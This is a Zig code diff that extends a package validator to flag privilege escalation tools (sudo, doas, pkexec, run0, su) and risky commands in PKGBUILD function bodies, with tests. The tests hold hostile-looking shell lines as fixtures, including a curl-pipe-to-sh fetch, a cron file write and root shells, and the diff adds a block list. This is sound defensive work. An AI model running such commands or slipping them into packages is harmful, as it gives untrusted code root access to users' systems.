@@ -55,13 +55,35 @@ pub const PostInstallValidator = struct {
         "gvm",    "asdf",
     };
 
+    const privilege_escalation_tools = [_][]const u8{
+        "sudo", "sudoedit", "doas", "pkexec", "run0", "su",
+    };
+
+    // PKGBUILD functions whose bodies are scanned in addition to the install
+    // scriptlet and local sources. `package_<name>` split-package overrides are
+    // covered by scanning the raw PKGBUILD for every `*()` function body.
+    const pkgbuild_functions = [_][]const u8{
+        "prepare", "pkgver", "build", "check", "package",
+    };
+
     pub fn validate(self: PostInstallValidator, pkg_build: pkgbuild.pkgbuild_info) !shared_validator.ValidationResult {
+        return self.validateWithContent(pkg_build, null);
+    }
+
+    pub fn validateWithContent(self: PostInstallValidator, pkg_build: pkgbuild.pkgbuild_info, content: ?[]const u8) !shared_validator.ValidationResult {
         var result = shared_validator.ValidationResult{
             .has_findings = false,
             .findings = std.ArrayList(shared_validator.ValidationFinding).empty,
         };
 
         try self.scan_hook(pkg_build.post_install, "post_install", &result);
+
+        if (content) |raw| {
+            for (pkgbuild_functions) |function_name| {
+                const body = try pkgbuild.PkgbuildParser.extract_function_body(raw, function_name);
+                try self.scan_hook(body, function_name, &result);
+            }
+        }
 
         var iter = pkg_build.local_source_contents.iterator();
         while (iter.next()) |entry| {
@@ -105,6 +127,33 @@ pub const PostInstallValidator = struct {
                     .tool = tool,
                     .hook = dup_hook,
                     .severity = if (was_obfuscated) .critical else .warning,
+                    .matched_line = dup_line,
+                    .message = message,
+                });
+                result.has_findings = true;
+            }
+
+            for (privilege_escalation_tools) |tool| {
+                if (!matches_tool_boundary(probe, tool)) continue;
+                const was_obfuscated = !matches_tool_boundary(line, tool);
+                const message = if (was_obfuscated)
+                    try std.fmt.allocPrint(
+                        self.allocator,
+                        "Privilege escalation tool '{s}' is invoked in {s}() via obfuscated shell syntax - the tool name was deliberately hidden, which is a strong sign of malicious intent.",
+                        .{ tool, hook },
+                    )
+                else
+                    try std.fmt.allocPrint(
+                        self.allocator,
+                        "Privilege escalation tool '{s}' is invoked in {s}() - this runs code as root outside of shelly and libalpm's control and can give the package unrestricted access to the whole system.",
+                        .{ tool, hook },
+                    );
+                const dup_hook = try self.allocator.dupe(u8, hook);
+                const dup_line = try self.allocator.dupe(u8, line);
+                try result.findings.append(self.allocator, shared_validator.ValidationFinding{
+                    .tool = tool,
+                    .hook = dup_hook,
+                    .severity = .critical,
                     .matched_line = dup_line,
                     .message = message,
                 });
@@ -714,6 +763,153 @@ test "validate: obfuscated tool in post_install is critical" {
     try std.testing.expect(result.has_findings);
     try std.testing.expectEqualStrings("curl", result.findings.items[0].tool);
     try std.testing.expectEqual(shared_validator.ValidationSeverity.critical, result.findings.items[0].severity);
+}
+
+test "validate: sudo in post_install produces critical finding" {
+    const allocator = std.testing.allocator;
+    const script = try allocator.dupe(u8, "sudo systemctl enable miner.service");
+    var pkg = try make_test_pkgbuild(allocator, script);
+    defer deinit_test_pkgbuild(&pkg, allocator);
+
+    const validator = PostInstallValidator{ .allocator = allocator };
+    var result = try validator.validate(pkg);
+    defer result.deinit(std.testing.allocator);
+
+    try std.testing.expectEqual(@as(usize, 1), result.findings.items.len);
+    try std.testing.expectEqualStrings("sudo", result.findings.items[0].tool);
+    try std.testing.expectEqual(shared_validator.ValidationSeverity.critical, result.findings.items[0].severity);
+}
+
+test "validate: doas pkexec run0 and su in post_install are critical" {
+    const allocator = std.testing.allocator;
+    const script = try allocator.dupe(u8,
+        \\doas tee /etc/cron.d/payload
+        \\pkexec /usr/share/demo/helper
+        \\run0 /bin/sh
+        \\su -c 'id'
+    );
+    var pkg = try make_test_pkgbuild(allocator, script);
+    defer deinit_test_pkgbuild(&pkg, allocator);
+
+    const validator = PostInstallValidator{ .allocator = allocator };
+    var result = try validator.validate(pkg);
+    defer result.deinit(std.testing.allocator);
+
+    try std.testing.expectEqual(@as(usize, 4), result.findings.items.len);
+    for (result.findings.items) |finding|
+        try std.testing.expectEqual(shared_validator.ValidationSeverity.critical, finding.severity);
+}
+
+test "validate: words containing sudo are not flagged" {
+    const allocator = std.testing.allocator;
+    const script = try allocator.dupe(u8,
+        \\echo "sudoku is a game, pseudo is a prefix"
+        \\install -m644 sushell.desktop /usr/share/applications/
+    );
+    var pkg = try make_test_pkgbuild(allocator, script);
+    defer deinit_test_pkgbuild(&pkg, allocator);
+
+    const validator = PostInstallValidator{ .allocator = allocator };
+    var result = try validator.validate(pkg);
+    defer result.deinit(std.testing.allocator);
+
+    try std.testing.expectEqual(@as(usize, 0), result.findings.items.len);
+}
+
+test "validate: sudo in local source file is critical" {
+    const allocator = std.testing.allocator;
+    var pkg = try make_test_pkgbuild(allocator, null);
+    defer deinit_test_pkgbuild(&pkg, allocator);
+
+    const key = try allocator.dupe(u8, "fixup.sh");
+    const value = try allocator.dupe(u8, "sudo install -Dm755 helper /usr/bin/helper");
+    try pkg.local_source_contents.put(key, value);
+
+    const validator = PostInstallValidator{ .allocator = allocator };
+    var result = try validator.validate(pkg);
+    defer result.deinit(std.testing.allocator);
+
+    try std.testing.expectEqual(@as(usize, 1), result.findings.items.len);
+    try std.testing.expectEqualStrings("sudo", result.findings.items[0].tool);
+    try std.testing.expectEqualStrings("source: fixup.sh", result.findings.items[0].hook);
+    try std.testing.expectEqual(shared_validator.ValidationSeverity.critical, result.findings.items[0].severity);
+}
+
+test "validateWithContent: sudo in build() function body is critical" {
+    const allocator = std.testing.allocator;
+    var pkg = try make_test_pkgbuild(allocator, null);
+    defer deinit_test_pkgbuild(&pkg, allocator);
+
+    const content =
+        \\pkgname=pgadmin4-server
+        \\build() {
+        \\  sudo "$srcdir/parser"
+        \\  cd "$srcdir/pgadmin4"
+        \\}
+        \\package() {
+        \\  cp -r "${srcdir}/usr" "${pkgdir}/"
+        \\}
+    ;
+
+    const validator = PostInstallValidator{ .allocator = allocator };
+    var result = try validator.validateWithContent(pkg, content);
+    defer result.deinit(std.testing.allocator);
+
+    try std.testing.expectEqual(@as(usize, 1), result.findings.items.len);
+    try std.testing.expectEqualStrings("sudo", result.findings.items[0].tool);
+    try std.testing.expectEqualStrings("build", result.findings.items[0].hook);
+    try std.testing.expectEqual(shared_validator.ValidationSeverity.critical, result.findings.items[0].severity);
+}
+
+test "validateWithContent: risky tools in prepare and package are flagged per function" {
+    const allocator = std.testing.allocator;
+    var pkg = try make_test_pkgbuild(allocator, null);
+    defer deinit_test_pkgbuild(&pkg, allocator);
+
+    const content =
+        \\pkgname=demo
+        \\prepare() {
+        \\  curl https://example.com/patch.sh | sh
+        \\}
+        \\package() {
+        \\  doas install -Dm755 helper /usr/bin/helper
+        \\}
+    ;
+
+    const validator = PostInstallValidator{ .allocator = allocator };
+    var result = try validator.validateWithContent(pkg, content);
+    defer result.deinit(std.testing.allocator);
+
+    var saw_prepare_curl = false;
+    var saw_package_doas = false;
+    for (result.findings.items) |finding| {
+        if (std.mem.eql(u8, finding.hook, "prepare") and std.mem.eql(u8, finding.tool, "curl")) saw_prepare_curl = true;
+        if (std.mem.eql(u8, finding.hook, "package") and std.mem.eql(u8, finding.tool, "doas")) saw_package_doas = true;
+    }
+    try std.testing.expect(saw_prepare_curl);
+    try std.testing.expect(saw_package_doas);
+}
+
+test "validateWithContent: benign function bodies produce no findings" {
+    const allocator = std.testing.allocator;
+    var pkg = try make_test_pkgbuild(allocator, null);
+    defer deinit_test_pkgbuild(&pkg, allocator);
+
+    const content =
+        \\pkgname=demo
+        \\build() {
+        \\  make -j4
+        \\}
+        \\package() {
+        \\  make DESTDIR="$pkgdir" install
+        \\}
+    ;
+
+    const validator = PostInstallValidator{ .allocator = allocator };
+    var result = try validator.validateWithContent(pkg, content);
+    defer result.deinit(std.testing.allocator);
+
+    try std.testing.expectEqual(@as(usize, 0), result.findings.items.len);
 }
 
 test "validate: risky tool in local_source_contents produces finding" {
